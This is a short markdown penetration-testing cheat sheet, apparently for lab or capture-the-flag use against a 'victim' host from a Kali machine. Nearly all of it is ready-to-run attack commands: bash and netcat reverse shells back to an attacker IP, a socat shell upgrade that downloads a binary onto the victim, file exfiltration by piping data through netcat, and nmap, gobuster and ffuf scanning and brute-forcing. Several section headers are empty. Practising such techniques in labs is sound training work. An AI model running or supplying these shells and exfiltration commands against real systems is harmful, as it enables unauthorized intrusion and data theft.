# Cheat sheet with my popular tools

> Victim host 10.10.10.77 and Kali host 10.10.10.10

![](https://i.pinimg.com/originals/2a/db/1e/2adb1e4dbe67ce0ff39c4b080f015aa3.jpg)

## Useful Commands

### Create web server

* #### With Python

```
python3 -m http.server 8888
``` 

```
python -m SimpleHTTPServer 8888
```

### Upgrade reverse shell

* #### With Socat

*Victim:* 
```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat
chmod +x socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```
        
*Kali:*
```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

* #### With Python

*Victim:* 
```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

### Send files

* #### With netcat

*Victim:*
```
cat file.txt | nc -q 0 10.10.10.10 4444
```

*Kali:*
```
nc -lvp 4444 > file.txt
```

* #### With web server

*Kali:*
```
python3 -m http.server 8888 
```

```
python -m SimpleHTTPServer 8888
```

* #### With SCP

*Copy from host*
```
scp user@10.10.10.77:/home/user/file.txt /home/kali/
```

*Copy to host* 
```
scp -r /home/kali/file.txt user@10.10.10.77:/home/user/
```

### Reverse shells

* #### With bash

```
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

* #### With netcat

```
nc -e /bin/sh 10.10.10.10 4444
```

* #### Listener

```
nc -lvp 4444
```

## Enumeration

* #### Nmap

TCP Scan:

```
nmap -sV -sC -p- 10.10.10.77
```

UDP Scan:

```
nmap -sU -sV -p- 10.10.10.77
```

### If Web Server

Full directory busting with extensions

* #### GoBuster

```
gobuster dir -e -u http://academy.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php,txt,htm,html,phtml,js,zip,rar,tar -s 200,302
```

* #### FuFF

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://academy.htb/FUZZ -e php,txt,htm,html,phtml,js,zip,rar,tar -mc 200,302
```

VHOST Discovery

```
ffuf -w subdomains-top1million-110000.txt -u https://10.10.10.77/ -H "Host:FUZZ.10.10.10.77"
```

## Privilege Escalation

## Reverse Engineering

## Some Scripts

## References
